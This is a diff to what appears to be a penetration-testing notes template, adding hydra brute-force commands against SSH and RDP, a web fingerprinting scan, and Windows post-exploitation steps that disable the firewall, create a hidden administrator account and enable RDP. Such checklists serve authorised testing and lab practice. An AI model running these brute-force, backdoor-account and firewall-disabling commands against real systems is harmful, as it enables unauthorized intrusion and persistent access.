@@ -65,7 +65,10 @@ If you have usernames test login with username:username
 
 INSERTSSHCONNECT
 
+INSERTSSHBRUTE
+
 ```
+hydra -I -t 5 -l username -P password ssh://INSERTIPADDRESS
 nc INSERTIPADDRESS 22
 ```
 
@@ -265,6 +268,7 @@ rdesktop -u guest -p guest INSERTIPADDRESS -g 94%
 
 # Brute force
 ncrack -vv --user Administrator -P /usr/share/wordlists/rockyou.txt rdp://INSERTIPADDRESS
+hydra -I -t 4 -L /root/Dropbox/Wordlists/quick_hit.txt -P /root/Dropbox/Wordlists/quick_hit.txt  rdp://INSERTIPADDRESS
 ```
 
 
@@ -291,12 +295,18 @@ View Source!
 
 Step 2: 
 Robots.txt!
+```
+wig-git -a -q -t 5 INSERTIPADDRESS
+ --proxy PROXY 
 
+INSERTROBOTS
+```
 Step 3: 
 Browse around and look for disclosed PII on site
 
 *Place anything here
 ```
+
 
 
 ```
@@ -682,7 +692,15 @@ ncrack -vv --user george -P /usr/share/wordlists/rockyou.txt rdp://INSERTIPADDRE
 ```
 
 ### Useful commands
+**Firewall**
 
+```
+Turn firewall off
+netsh firewall set opmode disable
+netsh advfirewall set allprofiles state off
+netsh advfirewall set currentprofile state off
+
+```
 
 **Add user and enable RDP**
 
@@ -691,11 +709,13 @@ net user haxxor Haxxor123 /add
 net localgroup Administrators haxxor /add
 net localgroup "Remote Desktop Users" haxxor /ADD
 
-# Enable RDP
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-
 Turn firewall off
 netsh firewall set opmode disable
+netsh advfirewall set allprofiles state off
+netsh advfirewall set currentprofile state off
+
+# Enable RDP
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 
 Or like this
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
